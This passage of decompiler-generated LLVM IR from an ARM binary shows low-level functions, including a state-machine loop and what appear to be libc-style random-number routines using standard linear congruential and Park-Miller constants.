  %v2_1396c = add i32 %v0_13960, 40
  %v3_1396c = inttoptr i32 %v2_1396c to i32*
  %v4_1396c = load i32, i32* %v3_1396c, align 4
  call void @__pseudo_branch(i32 %v4_1396c)
  %v1_1397c = call i32 @function_128f0(i32 6)
  %v0_13988 = load i32, i32* @r5, align 4
  %v2_13988 = add i32 %v0_13988, 20
  %v3_13988 = inttoptr i32 %v2_13988 to i32*
  %v4_13988 = load i32, i32* %v3_13988, align 4
  store i32 80276, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13988)
  %v4_13998.pre = load i32, i32* @global_var_29748.291, align 4
  br label %dec_label_pc_13994

dec_label_pc_13994:                               ; preds = %dec_label_pc_13900, %dec_label_pc_1395c
  %v0_139a8 = phi i32 [ %v4_13948, %dec_label_pc_13900 ], [ %v4_13998.pre, %dec_label_pc_1395c ]
  %v7_1399c = icmp eq i32 %v0_139a8, 1
  br i1 %v7_1399c, label %dec_label_pc_139a4, label %dec_label_pc_139e0

dec_label_pc_139a4:                               ; preds = %dec_label_pc_13994
  %v2_139a4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_139a4, i32* @r4, align 4
  store i32 2, i32* @global_var_29748.291, align 4
  store i32 20, i32* @r2, align 4
  %v2_139bc = bitcast i32* %stack_var_-28 to i8*
  %v3_139bc = call i32 @function_11f30(i8* %v2_139bc, i32 0)
  %v3_139d8 = call i32 @function_1503c(i32 6, i32 %v2_139a4, i32 0)
  br label %dec_label_pc_1395c

dec_label_pc_139e0:                               ; preds = %dec_label_pc_13994
  %v7_139e0 = icmp eq i32 %v0_139a8, 2
  br i1 %v7_139e0, label %dec_label_pc_139e8, label %dec_label_pc_139f4

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139e0
  store i32 3, i32* @global_var_29748.291, align 4
  %v0_139f0 = call i32 @function_13900()
  %v4_139f4.pre = load i32, i32* @global_var_29748.291, align 4
  br label %dec_label_pc_139f4

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139e0, %dec_label_pc_139e8
  %v1_139fc = phi i32 [ %v0_139a8, %dec_label_pc_139e0 ], [ %v4_139f4.pre, %dec_label_pc_139e8 ]
  %v7_139f8 = icmp eq i32 %v1_139fc, 3
  br i1 %v7_139f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_139f4
  store i32 4, i32* @global_var_29748.291, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_139f4, %bb
  call void @__pseudo_cond_branch(i1 %v7_139f8, i32 ptrtoint (i32* @global_var_1086c.293 to i32))
  br label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_13a0c, %.thread1
  %v0_13a0c = call i32 @function_13900()
  br label %dec_label_pc_13a0c

; uselistorder directives
  uselistorder i32* @global_var_29748.291, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10898, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_139f4, { 1, 0 }
  uselistorder label %dec_label_pc_13994, { 1, 0 }
}

define i32 @function_13a18(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a18:
  %v0_13a18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a18, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13a18
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13a18, %bb
  %v4_13a24 = phi i32 [ %arg1, %dec_label_pc_13a18 ], [ 0, %bb ]
  ret i32 %v4_13a24

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_13a28() local_unnamed_addr {
dec_label_pc_13a28:
  %v0_13a30 = call i32 @function_13a40()
  ret i32 %v0_13a30
}

define i32 @function_13a40() local_unnamed_addr {
dec_label_pc_13a40:
  %stack_var_-20 = alloca i32, align 4
  %v3_13a40 = load i32, i32* @r4, align 4
  store i32 144312, i32* @r4, align 4
  %v4_13a70 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13a70)
  %v0_13a84 = load i32, i32* @r4, align 4
  %v2_13a84 = add i32 %v0_13a84, 20
  %v3_13a84 = inttoptr i32 %v2_13a84 to i32*
  %v4_13a84 = load i32, i32* %v3_13a84, align 4
  store i32 ptrtoint (i32* @global_var_13a90.299 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13a84)
  %v2_13a94 = ptrtoint i32* %stack_var_-20 to i32
  %v0_13a98 = load i32, i32* @r4, align 4
  %v2_13a98 = add i32 %v0_13a98, 748
  %v2_13a9c = inttoptr i32 %v2_13a98 to i32*
  %v3_13a9c = call i32 @function_13de4(i32* %v2_13a9c, i32 %v2_13a94)
  %v0_13aac = load i32, i32* @r4, align 4
  %v2_13aac = add i32 %v0_13aac, 28
  %v3_13aac = inttoptr i32 %v2_13aac to i32*
  %v4_13aac = load i32, i32* %v3_13aac, align 4
  call void @__pseudo_branch(i32 %v4_13aac)
  %v3_13ab8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_13a40, i32* @r4, align 4
  ret i32 %v3_13ab8
}

define i32 @function_13acc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13acc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_13acc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13acc, label %bb, label %dec_label_pc_13acc..thread4_crit_edge

dec_label_pc_13acc..thread4_crit_edge:            ; preds = %dec_label_pc_13acc
  %v0_13b08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13acc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13acc..thread4_crit_edge, %bb
  %v0_13b08 = phi i32 [ %v0_13b08.pre, %dec_label_pc_13acc..thread4_crit_edge ], [ 0, %bb ]
  store i32 144312, i32* @r6, align 4
  %v2_13af8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v0_13b08, i32* @r5, align 4
  store i32 %v2_13af8, i32* %r0.global-to-local, align 4
  %v4_13b14 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b14)
  store i32 144908, i32* %r0.global-to-local, align 4
  %v0_13b28 = load i32, i32* @r6, align 4
  %v2_13b28 = add i32 %v0_13b28, 20
  %v3_13b28 = inttoptr i32 %v2_13b28 to i32*
  %v4_13b28 = load i32, i32* %v3_13b28, align 4
  store i32 80692, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13b28)
  %v0_13b38 = load i32, i32* @r6, align 4
  %v2_13b38 = add i32 %v0_13b38, 748
  %v0_13b40 = load i32, i32* @r5, align 4
  store i32 %v0_13b40, i32* %r0.global-to-local, align 4
  %v1_13b44 = add i32 %v0_13b38, 756
  %v2_13b44 = inttoptr i32 %v1_13b44 to i32*
  %v3_13b44 = load i32, i32* %v2_13b44, align 4
  store i32 %v3_13b44, i32* @r4, align 4
  %v2_13b48 = inttoptr i32 %v2_13b38 to i32*
  %v3_13b48 = call i32 @function_13d00(i32 %v0_13b40, i32* %v2_13b48)
  %v1_13b50 = icmp slt i32 %v3_13b48, 0
  store i32 %v2_13af8, i32* %r0.global-to-local, align 4
  %v3_13b60 = load i32, i32* @r4, align 4
  %v4_13b60 = add i32 %v3_13b60, -4
  %storemerge = select i1 %v1_13b50, i32 0, i32 %v4_13b60
  %v0_13b64 = load i32, i32* @r6, align 4
  %v2_13b64 = add i32 %v0_13b64, 28
  %v3_13b64 = inttoptr i32 %v2_13b64 to i32*
  %v4_13b64 = load i32, i32* %v3_13b64, align 4
  call void @__pseudo_branch(i32 %v4_13b64)
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_13b84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13b84:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_13b84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13b84, label %bb, label %dec_label_pc_13b84..thread4_crit_edge

dec_label_pc_13b84..thread4_crit_edge:            ; preds = %dec_label_pc_13b84
  %v0_13bb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13b84
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13b84..thread4_crit_edge, %bb
  %v0_13bb8 = phi i32 [ %v0_13bb8.pre, %dec_label_pc_13b84..thread4_crit_edge ], [ 0, %bb ]
  %v6_13b9c = load i32, i32* @r5, align 4
  store i32 144312, i32* @r4, align 4
  %v2_13bb0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 144908, i32* %r5.global-to-local, align 4
  store i32 %v0_13bb8, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %v2_13bb0, i32* %r0.global-to-local, align 4
  %v4_13bd4 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13bd4)
  %v0_13be0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13be0, i32* %r0.global-to-local, align 4
  %v0_13be8 = load i32, i32* @r4, align 4
  %v2_13be8 = add i32 %v0_13be8, 20
  %v3_13be8 = inttoptr i32 %v2_13be8 to i32*
  %v4_13be8 = load i32, i32* %v3_13be8, align 4
  store i32 80884, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13be8)
  %v0_13bf8 = load i32, i32* @r6, align 4
  %v0_13bfc = load i32, i32* @r4, align 4
  %v2_13bfc = add i32 %v0_13bfc, 748
  %v0_13c00 = load i32, i32* @r7, align 4
  %v0_13c04 = load i32, i32* @sl, align 4
  store i32 %v0_13c04, i32* @r0, align 4
  %v1_13c08 = add i32 %v0_13bfc, 756
  %v2_13c08 = inttoptr i32 %v1_13c08 to i32*
  %v3_13c08 = load i32, i32* %v2_13c08, align 4
  store i32 %v3_13c08, i32* @r5, align 4
  %v4_13c0c = inttoptr i32 %v0_13c04 to i32*
  %v5_13c0c = call i32 @function_13f4c(i32* %v4_13c0c, i32 %v0_13bf8, i32 %v0_13c00, i32 %v2_13bfc)
  store i32 %v2_13bb0, i32* %r0.global-to-local, align 4
  %v0_13c1c = load i32, i32* @r4, align 4
  %v2_13c1c = add i32 %v0_13c1c, 28
  %v3_13c1c = inttoptr i32 %v2_13c1c to i32*
  %v4_13c1c = load i32, i32* %v3_13c1c, align 4
  call void @__pseudo_branch(i32 %v4_13c1c)
  %v0_13c28 = load i32, i32* @r5, align 4
  %v1_13c28 = add i32 %v0_13c28, -4
  store i32 %v1_13c28, i32* %r0.global-to-local, align 4
  store i32 %v6_13b9c, i32* %r5.global-to-local, align 4
  ret i32 %v1_13c28

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_13c44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c44:
  %v0_13c44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c44, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13c44
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13c44, %bb
  %v10_13c58 = phi i32 [ %arg1, %dec_label_pc_13c44 ], [ 0, %bb ]
  ret i32 %v10_13c58

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_13c5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c5c:
  %stack_var_-40 = alloca i32, align 4
  %v3_13c5c = load i32, i32* @r4, align 4
  %v6_13c5c = load i32, i32* @r5, align 4
  %v9_13c5c = load i32, i32* @r6, align 4
  %v15_13c5c = load i32, i32* @lr, align 4
  store i32 144312, i32* @r4, align 4
  %v2_13c70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 144908, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_13c8c = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13c8c)
  %v0_13ca0 = load i32, i32* @r4, align 4
  %v2_13ca0 = add i32 %v0_13ca0, 20
  %v3_13ca0 = inttoptr i32 %v2_13ca0 to i32*
  %v4_13ca0 = load i32, i32* %v3_13ca0, align 4
  store i32 81068, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13ca0)
  %v0_13cb0 = load i32, i32* @r6, align 4
  store i32 %v0_13cb0, i32* @r0, align 4
  %v0_13cb4 = load i32, i32* @r4, align 4
  %v2_13cb4 = add i32 %v0_13cb4, 748
  %v2_13cb8 = inttoptr i32 %v0_13cb0 to i32*
  %v3_13cb8 = call i32 @function_13e74(i32* %v2_13cb8, i32 %v2_13cb4)
  %v0_13ccc = load i32, i32* @r4, align 4
  %v2_13ccc = add i32 %v0_13ccc, 28
  %v3_13ccc = inttoptr i32 %v2_13ccc to i32*
  %v4_13ccc = load i32, i32* %v3_13ccc, align 4
  call void @__pseudo_branch(i32 %v4_13ccc)
  store i32 %v3_13c5c, i32* @r4, align 4
  store i32 %v6_13c5c, i32* @r5, align 4
  store i32 %v9_13c5c, i32* @r6, align 4
  store i32 %v15_13c5c, i32* @lr, align 4
  ret i32 %v2_13c70

; uselistorder directives
  uselistorder i32 144908, { 1, 2, 0 }
}

define i32 @function_13ce8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13ce8:
  %v0_13ce8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ce8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13ce8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13ce8, %bb
  %v10_13cfc = phi i32 [ %arg1, %dec_label_pc_13ce8 ], [ 0, %bb ]
  ret i32 %v10_13cfc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_13d00(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_13d00:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_13d00 = load i32, i32* @r4, align 4
  store i32 %v3_13d00, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_13d08 = add i32 %tmp, 12
  %v2_13d08 = inttoptr i32 %v1_13d08 to i8*
  %v3_13d08 = load i8, i8* %v2_13d08, align 1
  %v2_13d0c = icmp eq i8 %v3_13d08, 0
  br i1 %v2_13d0c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %dec_label_pc_13d00
  %v4_13d08 = zext i8 %v3_13d08 to i32
  %v1_13d1411 = add i32 %arg1, 4
  store i32 %v1_13d1411, i32* %r6.global-to-local, align 4
  %v1_13d1812 = add i32 %tmp, 8
  %v2_13d1813 = inttoptr i32 %v1_13d1812 to i32*
  %v3_13d1814 = load i32, i32* %v2_13d1813, align 4
  %v3_13d34 = add i32 %v3_13d1814, -4
  %v4_13d34 = inttoptr i32 %v3_13d34 to i32*
  store i32 %v4_13d08, i32* %v4_13d34, align 4
  br label %dec_label_pc_13dc0

.thread6:                                         ; preds = %dec_label_pc_13d00
  %v2_13d10 = add i32 %tmp, 4
  %v3_13d10 = inttoptr i32 %v2_13d10 to i32*
  %v4_13d10 = load i32, i32* %v3_13d10, align 4
  %v1_13d14 = add i32 %arg1, 4
  store i32 %v1_13d14, i32* %r6.global-to-local, align 4
  %v1_13d18 = add i32 %tmp, 8
  %v2_13d18 = inttoptr i32 %v1_13d18 to i32*
  %v3_13d18 = load i32, i32* %v2_13d18, align 4
  %v3_13d20 = sub i32 %v4_13d10, %v3_13d18
  %v4_13d24 = sdiv i32 %v3_13d20, 4
  %v4_13d28 = sext i8 %v3_13d08 to i32
  %v4_13d30 = mul i32 %v4_13d24, 5
  %v5_13d30 = add i32 %v4_13d30, %v4_13d28
  %v3_13d38 = add i32 %v3_13d18, -4
  %v4_13d38 = inttoptr i32 %v3_13d38 to i32*
  store i32 %v5_13d30, i32* %v4_13d38, align 4
  br label %dec_label_pc_13dc0

dec_label_pc_13dc0:                               ; preds = %.thread5, %.thread6
  %v0_13d40 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d40 = add i32 %v0_13d40, -4
  %v2_13d40 = inttoptr i32 %v1_13d40 to i32*
  %v3_13d40 = load i32, i32* %v2_13d40, align 4
  %v3_13d48 = call i32 @function_18dd8(i32 %v3_13d40, i32 5)
  %v0_13dc0 = call i32 @function_1095c()
  %v2_13dc8 = inttoptr i32 %v0_13dc0 to i32*
  store i32 22, i32* %v2_13dc8, align 4
  %v2_13dd4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13dd4, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i8 %v3_13d08, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13dc0, { 1, 0 }
}

define i32 @function_13de4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13de4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13de4 = load i32, i32* @r4, align 4
  store i32 %v3_13de4, i32* %stack_var_-8, align 4
  %v1_13de8 = add i32 %tmp, 12
  %v2_13de8 = inttoptr i32 %v1_13de8 to i8*
  %v3_13de8 = load i8, i8* %v2_13de8, align 1
  %v4_13de8 = sext i8 %v3_13de8 to i32
  store i32 %v4_13de8, i32* %r3.global-to-local, align 4
  %v2_13dec = icmp eq i8 %v3_13de8, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_13df8 = add i32 %tmp, 8
  %v2_13df8 = inttoptr i32 %v1_13df8 to i32*
  %v3_13df8 = load i32, i32* %v2_13df8, align 4
  store i32 %v3_13df8, i32* %lr.global-to-local, align 4
  br i1 %v2_13dec, label %dec_label_pc_13e00, label %dec_label_pc_13e24

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13de4
  %v1_13e00 = inttoptr i32 %v3_13df8 to i32*
  %v2_13e00 = load i32, i32* %v1_13e00, align 4
  store i32 %v2_13e00, i32* %r2.global-to-local, align 4
  %v2_13e08 = mul i32 %v2_13e00, 1103515245
  %v1_13e10 = add i32 %v2_13e08, 12345
  %tmp6 = bitcast i32 %v1_13e10 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_13e14 = bitcast float %tmp7 to i32
  store i32 %v1_13e14, i32* %r3.global-to-local, align 4
  store i32 %v1_13e14, i32* %v1_13e00, align 4
  %v0_13e1c = load i32, i32* %r3.global-to-local, align 4
  %v2_13e1c = inttoptr i32 %arg2 to i32*
  store i32 %v0_13e1c, i32* %v2_13e1c, align 4
  br label %dec_label_pc_13e64

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13de4
  %v2_13e24 = load i32, i32* %arg1, align 4
  store i32 %v2_13e24, i32* %r2.global-to-local, align 4
  %v1_13e28 = add i32 %tmp, 4
  %v2_13e28 = inttoptr i32 %v1_13e28 to i32*
  %v3_13e28 = load i32, i32* %v2_13e28, align 4
  store i32 %v3_13e28, i32* %r0.global-to-local, align 4
  %v1_13e2c = inttoptr i32 %v2_13e24 to i32*
  %v2_13e2c = load i32, i32* %v1_13e2c, align 4
  store i32 %v2_13e2c, i32* %r1.global-to-local, align 4
  %v1_13e30 = inttoptr i32 %v3_13e28 to i32*
  %v2_13e30 = load i32, i32* %v1_13e30, align 4
  %v4_13e30 = add i32 %v3_13e28, 4
  store i32 %v4_13e30, i32* %r0.global-to-local, align 4
  %v2_13e34 = add i32 %v2_13e30, %v2_13e2c
  store i32 %v2_13e34, i32* %r3.global-to-local, align 4
  store i32 %v2_13e34, i32* %v1_13e2c, align 4
  %v3_13e38 = load i32, i32* %r2.global-to-local, align 4
  %v4_13e38 = add i32 %v3_13e38, 4
  store i32 %v4_13e38, i32* %r2.global-to-local, align 4
  %v0_13e3c = load i32, i32* %ip.global-to-local, align 4
  %v1_13e3c = add i32 %v0_13e3c, 16
  %v2_13e3c = inttoptr i32 %v1_13e3c to i32*
  %v3_13e3c = load i32, i32* %v2_13e3c, align 4
  store i32 %v3_13e3c, i32* %r1.global-to-local, align 4
  %v0_13e40 = load i32, i32* %r3.global-to-local, align 4
  %v3_13e40 = udiv i32 %v0_13e40, 2
  store i32 %v3_13e40, i32* %r3.global-to-local, align 4
  %v3_13e44 = icmp ult i32 %v4_13e38, %v3_13e3c
  %v1_13e48 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e48 = inttoptr i32 %v1_13e48 to i32*
  store i32 %v3_13e40, i32* %v2_13e48, align 4
  br i1 %v3_13e44, label %dec_label_pc_13e54, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_13e24
  %v1_13e4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13e4c, i32* %r2.global-to-local, align 4
  %v0_13e5c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e24
  %v0_13e54 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e54 = load i32, i32* %r1.global-to-local, align 4
  %v3_13e54 = icmp ult i32 %v0_13e54, %v1_13e54
  br i1 %v3_13e54, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13e54
  %v1_13e58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13e58, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_13e54, %._crit_edge, %bb
  %v0_13e5c = phi i32 [ %v0_13e5c.pre, %._crit_edge ], [ %v0_13e54, %dec_label_pc_13e54 ], [ %v1_13e58, %bb ]
  %v1_13e5c = load i32, i32* %ip.global-to-local, align 4
  %v2_13e5c = add i32 %v1_13e5c, 4
  %v3_13e5c = inttoptr i32 %v2_13e5c to i32*
  store i32 %v0_13e5c, i32* %v3_13e5c, align 4
  %v0_13e60 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e60 = load i32, i32* %ip.global-to-local, align 4
  %v2_13e60 = inttoptr i32 %v1_13e60 to i32*
  store i32 %v0_13e60, i32* %v2_13e60, align 4
  br label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e00, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13e68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e68, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_13e40, { 1, 0 }
  uselistorder i32 %v1_13e14, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_13e64, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @function_13e74(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e74:
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13e74 = load i32, i32* @r4, align 4
  store i32 %v3_13e74, i32* %stack_var_-36, align 4
  %v12_13e74 = load i32, i32* @r7, align 4
  %v1_13e78 = add i32 %tmp, 12
  %v2_13e78 = inttoptr i32 %v1_13e78 to i8*
  %v3_13e78 = load i8, i8* %v2_13e78, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_13e88 = load i8, i8* %v2_13e78, align 1
  %tmp24 = icmp ugt i8 %v3_13e78, 4
  br i1 %tmp24, label %.dec_label_pc_13f34_crit_edge, label %dec_label_pc_13e94

.dec_label_pc_13f34_crit_edge:                    ; preds = %dec_label_pc_13e74
  br label %dec_label_pc_13f34

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e74
  %v0_13e94 = load i32, i32* @r0, align 4
  %v2_13e94 = icmp eq i32 %v0_13e94, 0
  %v1_13e98 = add i32 %tmp, 8
  %v2_13e98 = inttoptr i32 %v1_13e98 to i32*
  %v3_13e98 = load i32, i32* %v2_13e98, align 4
  store i32 %v3_13e98, i32* %r6.global-to-local, align 4
  br i1 %v2_13e94, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_13e94
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13e94, %bb
  %v0_13ea4 = phi i32 [ %v0_13e94, %dec_label_pc_13e94 ], [ 1, %bb ]
  %v2_13ea0 = icmp eq i8 %v3_13e88, 0
  %v2_13ea4 = inttoptr i32 %v3_13e98 to i32*
  store i32 %v0_13ea4, i32* %v2_13ea4, align 4
  br i1 %v2_13ea0, label %dec_label_pc_13f30, label %dec_label_pc_13eac

dec_label_pc_13eac:                               ; preds = %bb21
  %v1_13eac = add i32 %tmp, 13
  %v2_13eac = inttoptr i32 %v1_13eac to i8*
  %v3_13eac = load i8, i8* %v2_13eac, align 1
  %v4_13eac = sext i8 %v3_13eac to i32
  store i32 %v4_13eac, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_13eb8 = load i32, i32* @r0, align 4
  store i32 %v0_13eb8, i32* @r4, align 4
  %v0_13ebc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13ebc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13eec

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13eec
  %v2_13ec8 = call i32 @function_18dd8(i32 %v0_13ef0, i32 127773)
  %v0_13ecc = load i32, i32* @r4, align 4
  store i32 %v0_13ecc, i32* @r0, align 4
  %v1_13ed0 = load i32, i32* %fp.global-to-local, align 4
  %v2_13ed0 = mul i32 %v1_13ed0, 127773
  store i32 %v2_13ed0, i32* @r4, align 4
  store i32 127773, i32* @r1, align 4
  %v0_13ed8 = call i32 @function_18cac()
  %v1_13edc = load i32, i32* %sb.global-to-local, align 4
  %v2_13edc = mul i32 %v1_13edc, %v0_13ed8
  %v0_13ee0 = load i32, i32* @r4, align 4
  %v2_13ee0 = sub i32 %v0_13ee0, %v2_13edc
  %v8_13ee0 = icmp slt i32 %v2_13ee0, 0
  br i1 %v8_13ee0, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_13ec8
  %v2_13ee4 = add i32 %v2_13ee0, 2147483647
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13ec8, %bb22
  %storemerge = phi i32 [ %v2_13ee4, %bb22 ], [ %v2_13ee0, %dec_label_pc_13ec8 ]
  %v0_13ee8 = phi i32 [ %v2_13ee4, %bb22 ], [ %v2_13ee0, %dec_label_pc_13ec8 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_13ee8 = load i32, i32* %r8.global-to-local, align 4
  %v2_13ee8 = add i32 %v1_13ee8, 4
  %v3_13ee8 = inttoptr i32 %v2_13ee8 to i32*
  store i32 %v0_13ee8, i32* %v3_13ee8, align 4
  %v4_13ee8 = load i32, i32* %r8.global-to-local, align 4
  %v5_13ee8 = add i32 %v4_13ee8, 4
  store i32 %v5_13ee8, i32* %r8.global-to-local, align 4
  %v0_13eec.pre = load i32, i32* @r7, align 4
  %v1_13eec.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_13ef0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13eac, %bb23
  %v0_13ef0 = phi i32 [ %v0_13eb8, %dec_label_pc_13eac ], [ %v0_13ef0.pre, %bb23 ]
  %v0_13f04 = phi i32 [ %v4_13eac, %dec_label_pc_13eac ], [ %v1_13eec.pre, %bb23 ]
  %v0_13ef8 = phi i32 [ 1, %dec_label_pc_13eac ], [ %v0_13eec.pre, %bb23 ]
  %v1_13ef8 = add i32 %v0_13ef8, 1
  store i32 %v1_13ef8, i32* @r7, align 4
  %v5_13efc = icmp slt i32 %v0_13ef8, %v0_13f04
  br i1 %v5_13efc, label %dec_label_pc_13ec8, label %dec_label_pc_13f00

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13eec
  %v2_13f04 = mul i32 %v0_13f04, 10
  store i32 %v2_13f04, i32* @r4, align 4
  %v0_13f08 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f08 = add i32 %v0_13f08, 14
